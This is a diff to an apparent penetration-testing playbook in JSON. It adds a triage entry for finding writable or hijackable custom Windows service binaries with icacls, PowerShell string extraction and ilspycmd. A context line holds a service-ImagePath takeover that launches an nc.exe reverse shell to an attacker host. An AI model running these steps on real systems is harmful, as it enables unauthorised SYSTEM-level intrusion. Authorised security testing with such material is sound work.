@@ -813,7 +813,9 @@
       ],
       "requires_any": [
         "privesc.weak_service_permission",
-        "privesc.dll_hijack_candidate"
+        "privesc.dll_hijack_candidate",
+        "privesc.library_or_script_hijack",
+        "privesc.path_hijack_candidate"
       ],
       "deprioritize_when": [
         "access.admin",
@@ -875,7 +877,9 @@
         "windows"
       ],
       "requires_any": [
-        "privesc.scheduled_task"
+        "privesc.scheduled_task",
+        "privesc.library_or_script_hijack",
+        "privesc.path_hijack_candidate"
       ],
       "produces": [
         "access.system"
@@ -1736,6 +1740,81 @@
           "tool": "powershell",
           "run": "powershell -ep bypass -c \"reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc' /v ImagePath /t REG_EXPAND_SZ /d 'C:\\Windows\\Temp\\nc.exe {{lhost}} {{lport}} -e cmd.exe' /f; sc.exe start UsoSvc\"",
           "note": "SeRestorePrivilege service takeover: Overwrite a SYSTEM service ImagePath and start the service for a SYSTEM shell."
+        }
+      ]
+    },
+    {
+      "id": "windows-custom-binary-triage",
+      "title": "Inspect Non-Standard Windows Service / Task Binary (icacls / strings / ilspycmd)",
+      "phase": "escalate",
+      "locus": "F",
+      "transition": "privesc_act",
+      "hypothesis": "When service, scheduled-task, or autorun enumeration reveals a custom executable outside C:\\Windows and baseline vendor paths (for example under C:\\Tools, C:\\Apps, C:\\Users, or a third-party Program Files folder), check its file and parent-folder ACLs first, inspect whether it is a managed .NET assembly or native PE, extract embedded paths/credentials/commands, and decompile .NET binaries offline with ilspycmd to spot Process.Start calls, DllImport targets, or hardcoded passwords.",
+      "tool": "icacls",
+      "tools": [
+        "icacls",
+        "powershell",
+        "strings"
+      ],
+      "os": [
+        "windows"
+      ],
+      "sequence": true,
+      "requires_all": [
+        "foothold.windows",
+        "privesc.custom_binary"
+      ],
+      "requires_any": [],
+      "produces": [
+        "privesc.path_hijack_candidate",
+        "privesc.library_or_script_hijack",
+        "privesc.weak_service_permission"
+      ],
+      "settled_by": [
+        "privesc.path_hijack_candidate",
+        "privesc.library_or_script_hijack",
+        "privesc.weak_service_permission"
+      ],
+      "obsoleted_by": [
+        "privesc.path_hijack_candidate",
+        "privesc.library_or_script_hijack",
+        "privesc.weak_service_permission",
+        "access.system",
+        "access.admin",
+        "objective.root_flag"
+      ],
+      "deprioritize_when": [
+        "access.system",
+        "access.admin"
+      ],
+      "priority": 76,
+      "proves": "whether the custom Windows binary or its directory is writable, or whether it invokes a hijackable relative command, external script, or custom DLL",
+      "does_not_prove": "SYSTEM execution until the writable binary, phantom DLL, or external script is replaced and triggered",
+      "report": {
+        "finding": "Non-Standard Privileged Windows Binary Exposed to ACL or Decompilation Triage",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html"
+      ],
+      "commands": [
+        {
+          "tool": "icacls",
+          "run": "icacls \"{{custom_bin|C:\\Tools\\service.exe}}\" & for %I in (\"{{custom_bin|C:\\Tools\\service.exe}}\") do icacls \"%~dpI.\"",
+          "note": "Check ACLs on both the executable and its parent directory (`(F)`, `(M)`, or `(W)` for `Users`, `Authenticated Users`, or `Everyone` allows direct binary replacement or phantom DLL planting).",
+          "locus": "onhost"
+        },
+        {
+          "tool": "powershell",
+          "run": "powershell -NoP -C \"$p='{{custom_bin|C:\\Tools\\service.exe}}'; $b=[IO.File]::ReadAllBytes($p); $s=[Text.Encoding]::ASCII.GetString($b); if($s -match 'mscoree\\.dll'){Write-Host '[+] Managed .NET assembly - pull to Kali for ilspycmd'}; [regex]::Matches($s,'[ -~]{5,}') | ForEach-Object {$_.Value} | Select-String -Pattern 'cmd|powershell|\\.dll|\\.ps1|\\.bat|password|connectionString|Process|\\\\'\"",
+          "note": "Detect whether the PE is a .NET assembly (`mscoree.dll`) and extract printable ASCII strings referencing external `.dll`/`.ps1`/`.bat` targets, command invocations, or connection strings without dropping tools on disk.",
+          "locus": "onhost"
+        },
+        {
+          "tool": "strings",
+          "run": "ilspycmd ./service.exe 2>/dev/null || strings -n 5 ./service.exe | grep -iE 'process|start|dll|bat|ps1|cmd|pass|user|key'",
+          "note": "On Kali after transferring the binary off-host (via SMB share, Evil-WinRM `download`, or base64): decompile .NET C# source with `ilspycmd` (or inspect native PE strings) to reveal exact `Process.Start`, `[DllImport]`, and credential logic.",
+          "locus": "remote"
         }
       ]
     }
